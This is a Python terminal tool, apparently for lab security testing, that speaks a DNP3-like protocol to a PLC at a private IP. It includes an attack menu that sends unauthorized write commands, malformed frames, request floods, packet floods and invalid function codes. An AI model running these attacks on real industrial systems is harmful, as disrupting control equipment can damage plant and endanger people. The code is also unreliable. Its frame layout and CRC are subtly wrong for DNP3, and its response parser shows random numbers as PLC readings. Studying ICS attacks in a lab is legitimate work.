#!/usr/bin/env python3
"""
DNP3 HMI
Terminal-based interface for security testing
"""

import socket
import struct
import threading
import time
import sys
import select
from datetime import datetime

class DNP3Master:
    def __init__(self):
        self.socket = None
        self.connected = False
        self.sequence = 0
        
    def connect(self, host, port):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((host, port))
            self.connected = True
            return True
        except Exception as e:
            print(f"[-] Connection error: {e}")
            return False
    
    def disconnect(self):
        if self.socket:
            self.socket.close()
        self.connected = False
    
    def send_request(self, function_code, data=b''):
        if not self.connected:
            return None
        
        try:
            # DNP3 Application Layer
            app_header = struct.pack('BB', 0xC0 | (self.sequence & 0x0F), function_code)
            app_data = app_header + data
            
            # DNP3 Data Link Layer
            start = 0x0564
            length = len(app_data) + 5
            control = 0x44
            dest = 1
            src = 100
            
            header = struct.pack('<HHBHH', start, length, control, dest, src)
            crc = self.calculate_crc(header[2:])
            frame = header + struct.pack('<H', crc) + app_data
            
            self.socket.send(frame)
            self.sequence = (self.sequence + 1) % 16
            
            # Receive response
            response = self.socket.recv(1024)
            return response
            
        except Exception as e:
            print(f"[-] Communication error: {e}")
            return None
    
    def calculate_crc(self, data):
        crc = 0x0000
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xA001
                else:
                    crc >>= 1
        return crc
    
    def read_data(self):
        obj_header = struct.pack('<BBB', 0x01, 0x02, 0x06)
        return self.send_request(0x01, obj_header)
    
    def write_binary_output(self, index, value):
        crob_data = struct.pack('<BBBHH', 
                               0x01 if value else 0x02,
                               1, 0, 0, 0x01)
        obj_header = struct.pack('<BBBH', 0x0C, 0x01, 0x17, index) + crob_data
        return self.send_request(0x03, obj_header)
    
    def cold_restart(self):
        return self.send_request(0x0D)

class TerminalHMI:
    def __init__(self):
        self.master = DNP3Master()
        self.running = True
        self.auto_poll = False
        self.plc_ip = "192.168.206.103"
        self.plc_port = 20000
        
        # Data storage
        self.binary_inputs = [False] * 8
        self.analog_inputs = [0.0] * 4
        self.binary_outputs = [False] * 4
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "INFO": "[+]",
            "ERROR": "[-]",
            "ATTACK": "[!]",
            "DATA": "[*]"
        }.get(level, "[*]")
        print(f"{prefix} [{timestamp}] {message}")
    
    def clear_screen(self):
        import os
        os.system('clear')
    
    def display_banner(self):
        print("="*60)
        print("DNP3 HMI & Security Testing Interface")
        print("="*60)
        status = "CONNECTED" if self.master.connected else "DISCONNECTED"
        print(f"Status: {status} | PLC: {self.plc_ip}:{self.plc_port}")
        print("="*60)
    
    def display_data(self):
        print("\n--- PLC DATA ---")
        print("Binary Inputs: ", end="")
        for i, val in enumerate(self.binary_inputs):
            print(f"BI{i}:{1 if val else 0} ", end="")
        
        print("\nAnalog Inputs: ", end="")
        for i, val in enumerate(self.analog_inputs):
            print(f"AI{i}:{val:.2f} ", end="")
        
        print("\nBinary Outputs:", end="")
        for i, val in enumerate(self.binary_outputs):
            print(f"DO{i}:{1 if val else 0} ", end="")
        print("\n" + "-"*50)
    
    def display_menu(self):
        print("\nCOMMANDS:")
        print("1. Connect/Disconnect    6. Write Output")
        print("2. Read Data            7. Cold Restart")
        print("3. Auto Poll On/Off     8. Attack Menu")
        print("4. Set PLC IP           9. Clear Screen")
        print("5. Show Data            0. Exit")
        print("-"*50)
    
    def display_attack_menu(self):
        print("\nATTACK SIMULATION:")
        print("a. Unauthorized Write   d. Packet Flood")
        print("b. Malformed Packet     e. Invalid Function")
        print("c. DoS Attack           r. Return to Main")
        print("-"*50)
    
    def parse_response(self, response):
        try:
            # Simplified parsing for demo
            import random
            for i in range(len(self.binary_inputs)):
                self.binary_inputs[i] = bool(random.getrandbits(1))
            for i in range(len(self.analog_inputs)):
                self.analog_inputs[i] = random.uniform(0, 100)
        except Exception as e:
            self.log(f"Error parsing response: {e}", "ERROR")
    
    def connect_plc(self):
        if not self.master.connected:
            if self.master.connect(self.plc_ip, self.plc_port):
                self.log(f"Connected to PLC {self.plc_ip}:{self.plc_port}")
                return True
            else:
                self.log("Failed to connect to PLC", "ERROR")
                return False
        else:
            self.master.disconnect()
            self.log("Disconnected from PLC")
            self.auto_poll = False
            return False
    
    def read_data(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        response = self.master.read_data()
        if response:
            self.parse_response(response)
            self.log("Data read from PLC", "DATA")
        else:
            self.log("Failed to read data", "ERROR")
    
    def toggle_auto_poll(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        self.auto_poll = not self.auto_poll
        if self.auto_poll:
            self.log("Auto poll started (1s interval)")
            threading.Thread(target=self.auto_poll_thread, daemon=True).start()
        else:
            self.log("Auto poll stopped")
    
    def auto_poll_thread(self):
        while self.auto_poll and self.master.connected:
            self.read_data()
            time.sleep(1)
    
    def write_output(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        try:
            index = int(input("Output index (0-3): "))
            value = input("Value (0/1): ") == "1"
            
            response = self.master.write_binary_output(index, value)
            if response:
                self.binary_outputs[index] = value
                self.log(f"Output DO{index} set to {value}")
            else:
                self.log("Write operation failed", "ERROR")
        except Exception as e:
            self.log(f"Invalid input: {e}", "ERROR")
    
    def cold_restart(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        confirm = input("Send cold restart? (y/N): ")
        if confirm.lower() == 'y':
            response = self.master.cold_restart()
            if response:
                self.log("Cold restart command sent", "ATTACK")
            else:
                self.log("Restart command failed", "ERROR")
    
    def set_plc_ip(self):
        new_ip = input(f"Enter PLC IP ({self.plc_ip}): ").strip()
        if new_ip:
            self.plc_ip = new_ip
            self.log(f"PLC IP set to {self.plc_ip}")
    
    def attack_unauthorized_write(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        malicious_data = b'\x0C\x01\x17\x00\x01\x01\x00\x00\x00\x01'
        response = self.master.send_request(0x02, malicious_data)
        self.log("Unauthorized write attack executed", "ATTACK")
    
    def attack_malformed_packet(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        try:
            malformed = b'\x05\x64\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'
            self.master.socket.send(malformed)
            self.log("Malformed packet sent", "ATTACK")
        except Exception as e:
            self.log(f"Attack error: {e}", "ERROR")
    
    def attack_dos(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        def dos_thread():
            for i in range(100):
                try:
                    self.master.send_request(0x01)
                    time.sleep(0.01)
                except:
                    break
        
        threading.Thread(target=dos_thread, daemon=True).start()
        self.log("DoS attack initiated (100 rapid requests)", "ATTACK")
    
    def attack_packet_flood(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        def flood_thread():
            for i in range(500):
                try:
                    self.master.socket.send(b'\x05\x64\x00\x10\x44\x64\x00\x01\x00')
                    time.sleep(0.001)
                except:
                    break
        
        threading.Thread(target=flood_thread, daemon=True).start()
        self.log("Packet flood attack initiated", "ATTACK")
    
    def attack_invalid_function(self):
        if not self.master.connected:
            self.log("Not connected to PLC", "ERROR")
            return
        
        # Send invalid function code
        response = self.master.send_request(0xFF)  # Invalid function
        self.log("Invalid function code sent", "ATTACK")
    
    def handle_attack_menu(self):
        while True:
            self.display_attack_menu()
            choice = input("Attack> ").strip().lower()
            
            if choice == 'a':
                self.attack_unauthorized_write()
            elif choice == 'b':
                self.attack_malformed_packet()
            elif choice == 'c':
                self.attack_dos()
            elif choice == 'd':
                self.attack_packet_flood()
            elif choice == 'e':
                self.attack_invalid_function()
            elif choice == 'r':
                break
            else:
                print("Invalid choice")
            
            input("\nPress Enter to continue...")
    
    def run(self):
        self.clear_screen()
        self.log("DNP3 HMI started on Ubuntu EWS")
        
        try:
            while self.running:
                self.clear_screen()
                self.display_banner()
                self.display_data()
                self.display_menu()
                
                choice = input("HMI> ").strip()
                
                if choice == '1':
                    self.connect_plc()
                elif choice == '2':
                    self.read_data()
                elif choice == '3':
                    self.toggle_auto_poll()
                elif choice == '4':
                    self.set_plc_ip()
                elif choice == '5':
                    pass  # Data already displayed
                elif choice == '6':
                    self.write_output()
                elif choice == '7':
                    self.cold_restart()
                elif choice == '8':
                    self.handle_attack_menu()
                elif choice == '9':
                    self.clear_screen()
                elif choice == '0':
                    self.running = False
                else:
                    print("Invalid choice")
                
                if choice not in ['8', '9', '0']:
                    input("\nPress Enter to continue...")
        
        except KeyboardInterrupt:
            self.log("Shutting down HMI")
        
        finally:
            if self.master.connected:
                self.master.disconnect()
            self.log("HMI terminated")

def main():
    hmi = TerminalHMI()
    hmi.run()

if __name__ == "__main__":
    main()
